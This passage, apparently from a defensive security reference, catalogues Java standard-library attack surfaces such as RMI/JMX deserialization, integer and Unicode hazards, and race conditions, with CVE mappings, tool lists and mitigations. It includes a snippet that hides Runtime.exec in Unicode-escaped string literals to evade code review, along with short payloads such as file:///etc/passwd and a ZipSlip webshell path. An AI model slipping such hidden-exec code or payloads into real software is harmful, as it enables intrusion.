| **Context classloader substitution** | `Thread.currentThread().setContextClassLoader(maliciousLoader)` — frameworks using context classloader now load attacker's classes | Attacker has code execution (e.g., via deserialization) | RCE |
| **`defineClass()` bytecode injection** | `ClassLoader.defineClass(name, bytecode, 0, bytecode.length)` creates a class from raw bytecode in a privileged package | Protected method accessible via reflection or subclass | RCE |
| **Class shadowing** | Attacker-controlled classpath entry loaded before legitimate one — attacker's `javax.crypto.Cipher` implementation replaces JDK's | `CLASSPATH` or `Class-Path` manifest manipulation | CRYPTO, RCE |

---

## §10. RMI and JMX (`java.rmi`, `javax.management`)

### §10-1. RMI Deserialization Attack Surface

RMI uses Java native serialization as its wire protocol. Every RMI endpoint is an implicit deserialization endpoint.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Registry deserialization** | `RegistryImpl_Skel.dispatch()` deserializes arguments from unauthenticated clients — any object sent as a registry bind/lookup argument is deserialized | RMI registry exposed on network (port 1099) | RCE |
| **DGC deserialization** | Distributed Garbage Collector endpoint always available on RMI ports — `DGCImpl_Skel.dispatch()` deserializes `ObjID[]`, `VMID`, `Lease` | Any exposed RMI port | RCE |
| **JRMP deserialization** | JRMP protocol itself deserializes objects during connection setup — even before application-level methods are invoked | Any RMI communication | RCE |
| **Remote classloading** | `java.rmi.server.codebase` property tells clients to load stub classes from attacker-controlled URL | Server specifies attacker-controlled codebase | RCE |

**CVEs:** CVE-2016-3427 (JMX RCE, CVSS 9.8), CVE-2017-3241, CVE-2018-2800, CVE-2020-2604, CVE-2023-21830.

### §10-2. JMX Attack Chain

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Unauthenticated MBean invocation** | JMX port exposed without authentication → attacker invokes arbitrary MBean methods | JMX remote connector without authentication (common in dev) | RCE |
| **MLet remote MBean loading** | `javax.management.loading.MLet` MBean loads MBean definitions from attacker-controlled URL → custom MBean executes arbitrary code | MLet MBean available (default); no auth | RCE |
| **MBean attribute manipulation** | Modifying runtime MBean attributes (logging config, thread pools, connection limits) to alter application behavior | JMX access without write restrictions | DoS, INFO |

---

## §11. Integer and Type System Hazards (`java.lang`)

### §11-1. Integer Overflow

Java uses signed 32/64-bit integers with silent wrapping (no exception on overflow). `Math.addExact()` / `Math.multiplyExact()` (JDK 8+) throw `ArithmeticException` but are not used by default.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Buffer allocation overflow** | `width * height * bytesPerPixel` overflows to small/negative value → undersized buffer allocated → write past bounds | Image/file processing with user-controlled dimensions | RCE, DoS |
| **Bounds check bypass** | `offset + length > buffer.length` — if `offset + length` overflows to negative, check passes → out-of-bounds access | User-controlled offset and length without overflow check | INFO, RCE |
| **`Math.abs(Integer.MIN_VALUE)`** | Returns `Integer.MIN_VALUE` (negative!) — `Math.abs(hash) % buckets` produces negative array index | Hash-based bucket assignment without masking: `(hash & 0x7FFFFFFF) % n` is safe | DoS |
| **Financial calculation overflow** | `quantity * priceInCents` overflows → customer credited instead of charged | `int` arithmetic for monetary values without `BigDecimal` | INTEGRITY |

### §11-2. Type Casting Truncation

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Long-to-int truncation** | `(int) contentLength` where `contentLength = 4294967396L` → `bufferSize = 100` (upper 32 bits discarded) | HTTP Content-Length parsed as long, used as int | RCE, DoS |
| **Double-to-int saturation** | `(int) 2e18` = `Integer.MAX_VALUE` (saturates, unlike int-to-int wrap); `(int) Double.NaN` = 0 | Numeric conversion without range validation | INTEGRITY |
| **Byte sign extension** | `byte b = (byte) 0xFF; int i = b;` → `i = -1` (sign-extended), not 255 — use `b & 0xFF` for unsigned interpretation | Binary protocol parsing, network byte handling | INTEGRITY |

### §11-3. Autoboxing and Comparison

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Integer cache boundary** | `Integer a = 127; Integer b = 127; a == b` → true. `Integer c = 128; Integer d = 128; c == d` → false. Cache range: [-128, 127] | `==` used instead of `.equals()` for wrapper types | AUTHZ |
| **Auto-unboxing NPE** | `Integer nullableCount = null; int count = nullableCount;` → `NullPointerException` | Database/API returns null boxed value | DoS |
| **BigDecimal.equals() scale sensitivity** | `new BigDecimal("2.0").equals(new BigDecimal("2.00"))` → false (different scales) — breaks HashMap keys | `HashMap<BigDecimal, V>` with varying scales | INTEGRITY |
| **BigDecimal.toPlainString() bomb** | `new BigDecimal("1E-2147483647").toPlainString()` → attempts to create string with 2B zeros → OOM from 16-char input | User-controlled BigDecimal string without validation | DoS |

---

## §12. Concurrency Hazards (`java.util.concurrent`)

### §12-1. Check-Then-Act Race Conditions

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Token reuse race** | Two threads validate same one-time token simultaneously — both see token present, both consume it, both succeed | `HashMap.get()` + `HashMap.remove()` non-atomic; use `ConcurrentHashMap.remove(key, value)` | AUTHZ |
| **Rate limiter bypass** | `if (count < MAX) count++` — multiple threads pass check before any increment | Non-atomic read-compare-write; use `AtomicInteger.getAndUpdate()` | AUTHZ |
| **Singleton partial construction** | Double-checked locking without `volatile` → thread sees non-null reference to incompletely constructed object (fields still default values) | Pre-Java 5 memory model; or missing `volatile` keyword | AUTHZ, CRYPTO |

### §12-2. Shared Mutable State

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **`SimpleDateFormat` corruption** | Shared `SimpleDateFormat` across threads → `format()` mutates internal `Calendar` → Thread A gets Thread B's date | Static field or shared instance without synchronization | INTEGRITY, INFO |
| **`HashMap` concurrent modification** | JDK 7: infinite loop via circular linked list during concurrent resize. JDK 8+: silent data loss, corrupted tree structure | Unsynchronized `HashMap` accessed by multiple threads | DoS, INTEGRITY |
| **`volatile` compound operation** | `volatile int count; count++` is NOT atomic — read-modify-write still races | Developer assumes `volatile` provides atomicity | AUTHZ |
| **`Collections.unmodifiableMap()` deep mutation** | Wrapper prevents `put()`/`remove()` but `get().add()` mutates values in underlying map; original reference still mutable | Mutable value objects; original map reference retained | AUTHZ |

### §12-3. Hash Collision DoS

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **String hashCode collision** | `"Aa".hashCode() == "BB".hashCode()` — combining 2-char building blocks generates 2^N collisions. N=16 → 65536 strings, all same hash | User-controlled strings as HashMap keys (HTTP parameters, JSON keys) | DoS |
| **JDK 7 O(n²) degradation** | Pre-treeification: all collisions in one linked list → O(n) per lookup → O(n²) for n insertions | JDK < 8; or custom objects with poor `hashCode()` | DoS |
| **JDK 8 treeification bypass** | Custom objects not implementing `Comparable` → tree uses `identityHashCode` tiebreaker → less effective than compareTo-based ordering | Non-Comparable key types | DoS |

---

## §13. String and Encoding Hazards

### §13-1. Charset and Encoding

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Platform-dependent default charset** | `new String(bytes)` uses `Charset.defaultCharset()` — Windows: windows-1252, Linux: UTF-8. Same bytes → different strings | JDK < 18; cross-platform deployment | INTEGRITY |
| **Overlong UTF-8 encoding** | `0xC0 0xAF` decodes to `/` (U+002F) in lenient decoders — bypasses `/` checks before normalization | Custom UTF-8 decoders; JNI modified-UTF-8 boundary | FS |
| **Turkish locale case mapping** | `"FILE".toLowerCase(new Locale("tr"))` → `"f\u0131le"` (dotless i) — breaks case-insensitive security comparisons | Locale-sensitive `toLowerCase()`/`toUpperCase()` without `Locale.ROOT` | AUTHZ |

### §13-2. Unicode Normalization Attacks

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **Fullwidth character bypass** | `\uFF1Cscript\uFF1E` (fullwidth `<script>`) → NFKC normalizes to `<script>` — bypasses pre-normalization XSS filter | Validation before normalization; output after normalization | AUTHZ |
| **Fullwidth path separator** | `\uFF0F` → `/`, `\uFF3C` → `\` under NFKC — path traversal via fullwidth characters | Unicode input accepted and normalized after security check | FS |
| **Homoglyph confusion** | Cyrillic `а` (U+0430) visually identical to Latin `a` (U+0061) — attacker registers `аdmin` username | No homoglyph detection on user identifiers | AUTHZ |
| **German ß expansion** | `"straße".toUpperCase()` → `"STRASSE"` (one char becomes two) — length changes after case conversion break fixed-offset logic | Case conversion changes string length | INTEGRITY |

### §13-3. Log Injection

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **CRLF injection in logs** | User input containing `\r\n` creates forged log entries indistinguishable from legitimate ones | No newline sanitization in log messages; text-based log format | INTEGRITY |
| **SLF4J `{}` no-sanitize** | `logger.info("User: {}", username)` — `{}` substitution does NOT sanitize newlines (performance optimization, not security feature) | Common misconception that parameterized logging sanitizes input | INTEGRITY |

### §13-4. Compile-Time Unicode Escape Processing

The Java compiler processes `\uXXXX` Unicode escapes at the lexical level — before parsing, tokenizing, or interpreting string boundaries. This means a Unicode escape inside a string literal is resolved to its character *before* the compiler determines where the string ends. This is distinct from runtime string escapes (`\n`, `\t`) and from Trojan Source (BiDi) attacks that use directional override characters.

| Subtype | Mechanism | Key Condition | Impact |
|---|---|---|---|
| **String boundary injection via `\u0022`** | `\u0022` compiles to literal `"` character at the lexical stage → closes the enclosing string literal, allowing injection of arbitrary Java statements between the closing and a subsequent opening `\u0022` | Java source code containing user-contributed or review-evading snippets | RCE |
| **Code review evasion** | Source code containing `\u0022; Runtime.getRuntime().exec(cmd); \u0022` appears as a normal string constant in editors and review tools that do not pre-resolve Unicode escapes — visually innocuous code hides an RCE payload | Human or automated code review that does not expand `\uXXXX` sequences | RCE |
| **Malicious Bambdas / contributed snippets** | Threat model: platforms accepting user-contributed Java code (e.g., Burp Suite Bambdas, plugin systems, online judges) where a snippet appears to be a harmless string but compiles to arbitrary code execution | Any system compiling untrusted Java source | RCE |

**Example — hidden RCE in a string literal:**
```java
// In source code, this appears as a single string assignment with Unicode escapes:
String s = "\u0022; Runtime.getRuntime().exec(new String[]{\u0022calc\u0022}); //\u0022";
// After compile-time Unicode escape resolution (\u0022 → "), this becomes:
// String s = ""; Runtime.getRuntime().exec(new String[]{"calc"}); //"";
// Editors that do not resolve \uXXXX show the entire line as a string constant.
```

---

## Attack Scenario Mapping

| Attack Scenario | Primary Sections | Chain Example |
|---|---|---|
| **SSRF to Cloud Metadata** | §3-1, §3-2, §3-3, §4-1 | URL parser differential → InetAddress obfuscation → DNS rebinding → `http://169.254.169.254/` |
| **Deserialization RCE** | §1-1, §1-2, §10-1 | Exposed RMI port → DGC deserialization → Commons Collections gadget chain → `Runtime.exec()` |
| **Log4Shell Full Chain** | §2-2, §2-1, §1-2 | HTTP header → Log4j2 message lookup → JNDI LDAP → remote classloading or local deserialization → RCE |
| **XXE to Internal Network** | §4-1, §4-3 | XML upload → DocumentBuilder with default config → `file:///etc/passwd` or SSRF via `jar:` protocol |
| **ZipSlip to Webshell** | §8-1, §7-1 | Malicious ZIP entry `../../../webapps/ROOT/cmd.jsp` → extraction overwrites webshell → RCE |
| **Crypto Downgrade** | §6-1, §6-2, §3-5 | ECB mode default → padding oracle on CBC → PRNG state recovery → forged tokens |
| **Command Injection** | §5-1, §5-2 | User input to `ProcessBuilder` with shell → metacharacter injection → `LD_PRELOAD` in environment → RCE |
| **Hash Collision + Race** | §12-3, §12-1 | HashDoS on session HashMap → concurrent modification → session data corruption → AUTHZ bypass |

---

## CVE / Bounty Mapping (2020–2025)

| Mutation Combination | CVE | Year | Impact |
|---|---|---|---|
| §2-2 (Log4j JNDI) | CVE-2021-44228 | 2021 | Critical (10.0) — Log4Shell RCE via JNDI message lookup |
| §2-2 (Log4j bypass) | CVE-2021-45046 | 2021 | Critical (9.0) — Bypass of CVE-2021-44228 fix |
| §2-2 (Log4j DoS) | CVE-2021-45105 | 2021 | High (7.5) — Infinite recursion DoS |
| §2-2 (Log4j JDBC) | CVE-2021-44832 | 2021 | Medium (6.6) — RCE via JDBC Appender config |
| §2-2 (Log4j 1.x) | CVE-2021-4104 | 2021 | High (7.5) — JMSAppender JNDI injection |
| §2-2 (Logback JNDI) | CVE-2021-42550 | 2021 | Medium (6.6) — Logback insertFromJNDI RCE |
| §3-5 (Psychic Signatures) | CVE-2022-21449 | 2022 | High (7.5) — ECDSA blank signature acceptance (JDK 15, 16, 17 before 17.0.3, 18 before 18.0.1) |
| §3-3 (FTP PASV SSRF) | FTP PASV SSRF pattern | — | SSRF pattern via attacker-controlled PASV response. Not mapped here to CVE-2021-2341 because that Oracle Java CVE describes a different networking issue |
| §1-3 (Filter bypass) | CVE-2022-21248 | 2022 | Low (3.7) — Serialization filter bypass |
| §10-1 (JMX RCE) | CVE-2016-3427 | 2016 | Critical (9.8) — JMX unauthenticated deserialization |
| §10-1 (RMI deser) | CVE-2017-3241 | 2017 | Critical (9.8) — RMI registry deserialization bypass |
| §10-1 (Deser filter) | CVE-2020-2604 | 2020 | High (8.1) — Serialization filter bypass in RMI |
| §4-3 (XSLT truncation) | CVE-2022-34169 | 2022 | High (7.5) — Apache Xalan integer truncation in XSLT |
| §3-3 (Networking) | CVE-2023-21937 | 2023 | Low (3.7) — Networking component vulnerability |
| §3-5 (JSSE TLS) | CVE-2023-21930 | 2023 | High (7.4) — JSSE TLS handshake vulnerability |
| §6-2 (Android PRNG) | CVE-2013-7372 | 2013 | High — Android SecureRandom ECDSA nonce prediction |
| §8-1 (ZipSlip) | CVE-2018-1002200 | 2018 | High — plexus-archiver path traversal |
| §8-1 (ZipSlip) | CVE-2018-8009 | 2018 | High — Apache Hadoop archive extraction |
| §8-1 (Commons Compress) | CVE-2023-42503 | 2023 | Medium — Apache Commons Compress traversal |
| §11-1 (Buffer overflow) | CVE-2020-2803 | 2020 | High (8.3) — java.nio.Buffer boundary check bypass via integer overflow |

---

## Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **ysoserial** | Java deserialization (§1) | Gadget chain generation for 30+ libraries |
| **ysoserial-modified** | Extended deserialization | Additional chains (CommonsCollections variants, JDK-only chains) |
| **JNDI-Exploit-Kit** | JNDI injection (§2) | LDAP/RMI server with multiple exploitation backends |
| **marshalsec** | JNDI + deserialization | Generates marshalling payloads for various Java libraries |
| **GadgetInspector** | Gadget chain mining (§1-2) | Static analysis call graph traversal from deser entry points to sinks |
| **remote-method-guesser** | RMI (§10) | RMI endpoint enumeration, method guessing, deserialization |
| **BaRMIe** | RMI/JMX (§10) | RMI enumeration and attack framework |
| **XXEinjector** | XXE (§4) | Automated XXE exploitation with OOB exfiltration |
| **Log4jShell** | Log4Shell (§2-2) | Log4j vulnerability scanner with payload generation |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **NotSoSerial** | Deserialization (§1) | Java agent that restricts deserializable classes at the JVM level |
| **SerialKiller** | Deserialization (§1) | Drop-in `ObjectInputStream` replacement with allowlist/denylist |
| **contrast-rO0** | Deserialization (§1) | Runtime deserialization attack detection |
| **ObjectInputFilter (JEP 290)** | Deserialization (§1) | JDK-native deserialization filtering (JDK 9+) |
| **Snyk / Dependabot** | All CVEs | SCA scanning for vulnerable dependencies |
| **SpotBugs + FindSecBugs** | Multiple (§4, §5, §6) | Static analysis for XXE, command injection, crypto misuse |
| **Semgrep** | Multiple categories | Pattern-based rules for Java security antipatterns |

### Research / Fuzzing Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **FLASH** | Gadget chain mining (§1-2) | Hybrid dispatch deserialization-guided chain construction (USENIX 2025) |
| **ODDFuzz** | Gadget chain mining (§1-2) | Structure-aware directed greybox fuzzing for deserialization |
| **GadgetProbe** | Classpath enumeration | DNS-based detection of classes present on target classpath |
| **CodeQL** | Multiple categories | Semantic code analysis queries for Java security patterns |

---

## Summary: Core Principles

### Why the Java Standard Library Is a Rich Attack Surface

Java's security surface is the product of three interacting design forces:

1. **Specification fidelity creates insecure defaults.** Java's XML parsers support external entities because the XML specification requires it. Java's ZIP API accepts `../` in entry names because the ZIP specification allows it. Java's `URL` class performs DNS resolution in `equals()` because the design intended URL equality to be semantic, not syntactic. In each case, following the specification faithfully created an insecure default that developers must explicitly override.

2. **Backward compatibility preserves dangerous APIs.** `ObjectInputStream` cannot be made safe by default because millions of existing applications depend on its current behavior. `Runtime.exec(String)` cannot be removed because existing code uses it. XML parsers cannot disable external entities by default because existing DTD-dependent code would break. The result is a growing collection of APIs that are dangerous by default but cannot be changed.

3. **Low-level primitives without high-level safe abstractions.** Java provides `Cipher.getInstance("AES")` (which defaults to ECB mode) but no `SecureEncrypt.encrypt(key, plaintext)` that does AES-GCM with proper nonce management. Java provides `ProcessBuilder` but no `SafeCommand.run(program, args)` that handles argument escaping. Java provides `ZipInputStream` but no `SafeExtractor.extract(zip, destDir)` that validates entry paths. The developer must compose the safe pattern from low-level primitives every time.

### Why Incremental Patches Fail

1. **The classpath is the attack surface.** Deserialization vulnerabilities (§1) are not in a single library but in the composition of classes on the classpath. Every new library added creates potential new gadget chains. The attack surface grows with every dependency.

2. **Denylist exhaustion.** JNDI restrictions (§2-3), deserialization filters (§1-3), and XSLT function denylists (§4-3) are all defeated by discovering new classes not on the denylist. This is a fundamentally losing strategy against an attacker who can inspect the classpath.

3. **Parser differentials are combinatorial.** URL confusion (§3-1) exists because `URL`, `URI`, `InetAddress`, and `HttpURLConnection` each parse the same input differently. Fixing one parser's behavior shifts the differential to another pair.

### Structural Solution Direction

- Replace `ObjectInputStream` with type-safe formats (Protocol Buffers, Jackson with polymorphism disabled, flat JSON/MessagePack) — §1
- Eliminate JNDI lookup from all untrusted input paths; set `trustURLCodebase=false` globally; use JDK 17+ filter factories — §2
- Use `URI` exclusively for URL parsing; resolve DNS once and pin the result; disable redirects or validate each hop — §3
- Disable DTDs entirely (`disallow-doctype-decl`); disable XSLT extension functions; use `XPathVariableResolver` for parameterized XPath — §4
- Use `ProcessBuilder` with explicit `String[]` arguments; never invoke a shell; sanitize environment — §5
- Use `AES/GCM/NoPadding` with random 96-bit nonce; `SecureRandom` only; PBKDF2 ≥ 600,000 iterations; `MessageDigest.isEqual()` for comparison; `char[]` for passwords — §6
- Use `getCanonicalPath()`/`toRealPath()` with base directory prefix check; `CREATE_NEW` for atomic creation; check for symlinks — §7
- Validate `ZipEntry.getName()` against canonical destination path; enforce decompressed size, entry count, and ratio limits — §8
- Minimize `--add-opens` flags; prefer method handles over reflection; restrict `ClassLoader` sources — §9
- Never expose RMI/JMX without authentication and TLS; apply JEP 290 filters to all RMI endpoints — §10
- Use `Math.addExact()`/`Math.multiplyExact()` for security-sensitive arithmetic; `.equals()` not `==` for wrapper types — §11
- Use `ConcurrentHashMap` with atomic compound operations; `DateTimeFormatter` instead of `SimpleDateFormat`; never share mutable state without synchronization — §12
- Always specify `StandardCharsets.UTF_8`; normalize then validate; `Locale.ROOT` for security comparisons — §13

---

## References

### Sources Consulted

- OpenJDK Source Code (github.com/openjdk/jdk) — `java.net.URL`, `java.io.ObjectInputStream`, `javax.xml.parsers`, `javax.crypto.Cipher`, `java.lang.ProcessBuilder`
- Oracle Critical Patch Update Advisories (2020–2025)
- National Vulnerability Database (nvd.nist.gov) — CVE records 2013–2025
- ysoserial Project (github.com/frohoff/ysoserial) — Java deserialization gadget chains
- Claroty Team82 URL Parsing Confusion Research (2022)
- OWASP Top 10 (2021, 2025), OWASP Java Security Cheat Sheet
- Apache Log4j Security Advisories — CVE-2021-44228 through CVE-2021-44832
- Snyk Research — ZipSlip vulnerability disclosure (2018)
- USENIX Security 2025 — FLASH: Automated Gadget Chain Mining
- ICSE 2023 — Overriding-Guided Gadget Chain Generation
- Neil Madden — "Psychic Signatures" CVE-2022-21449 analysis
- Oracle JCA Reference Guide — Cipher, SecureRandom, KeyPairGenerator defaults
- Java Language Specification (JLS) — §4.6 Type Erasure, §5.1.7 Boxing Conversion, §4.10.3 Array Subtyping
- OWASP XXE Prevention Cheat Sheet — Parser-specific hardening configurations
- PortSwigger Research — XXE, SSRF, Deserialization
- PortSwigger Research (Gareth Heyes) — "Hiding payloads in Java source code strings" (2024): https://portswigger.net/research/hiding-payloads-in-java-source-code-strings

---

*This document was created for defensive security research and vulnerability understanding purposes.*
